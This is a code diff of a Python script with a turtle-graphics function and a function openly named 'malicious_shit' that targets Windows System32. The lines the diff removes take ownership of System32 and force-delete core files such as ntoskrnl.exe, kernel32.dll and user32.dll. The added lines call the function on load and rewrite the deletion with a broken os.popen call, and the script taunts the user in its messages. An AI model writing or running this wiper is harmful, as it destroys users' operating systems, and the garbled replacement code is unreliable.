@@ -1,11 +1,10 @@
-import subprocess
+import os
 import time
 from turtle import *
 import turtle
-system32 = r"C:/Windows/System32"
+system32 = "C:\\Windows\\System32"
 def malicious_shit():
-    subprocess.run(["takeown", "/f", system32],shell=True)
-    subprocess.run(["cacls",system32])
+    os.popen("icacls")
     kern32="C:\\Windows\\System32\\ntoskrnl.exe"
     kernel="C:\\Windows\\System32\\kernel32.dll"
     user="C:\\Windows\\System32\\user32.dll"
@@ -18,17 +17,8 @@ def malicious_shit():
     comdlg="C:\\Windows\\System32\\comdlg32.dll"
     msvcrt="C:\\Windows\\System32\\msvcrt.dll"
     try :
-         subprocess.run(["del","/q"," /f"," /s ",kern32], shell=True)
-         subprocess.run(["del"," /q"," /f"," /s ",kernel],shell=True)
-         subprocess.run(["del"," /q" ,"/f","/s ",kerneldll],shell=True)
-         subprocess.run(["del"," /q"," /f"," /s ",user],shell=True)
-         subprocess.run(["del ","/q ","/f ","/s ",gdi],shell=True)
-         subprocess.run(["del"," /q ","/f" ,"/s ",advapi],shell=True)
-         subprocess.run(["del"," /q", "/f ","/s ",shell],shell=True)
-         subprocess.run(["del"," /q" ,"/f"," /s ",ole],shell=True)
-         subprocess.run(["del", "/q"," /f"," /s ",oleaut],shell=True)
-         subprocess.run(["del" , "/q", "/f", "/s",comdlg],shell=True)
-         subprocess.run(["del", "/q", "/f", "/s",msvcrt],shell=True)
+         os.popen("del /q /f /s",kern32)
+        
     except OSError :
          print("Check your permissions stupid")
          input("Press any key to exit")
@@ -37,6 +27,7 @@ def malicious_shit():
          print("Coward 🤣🫵")
          input("Press any key to exit")
          exit(0)
+malicious_shit()
 def graphics():
         screen = turtle.Screen()
         screen.bgcolor("black")
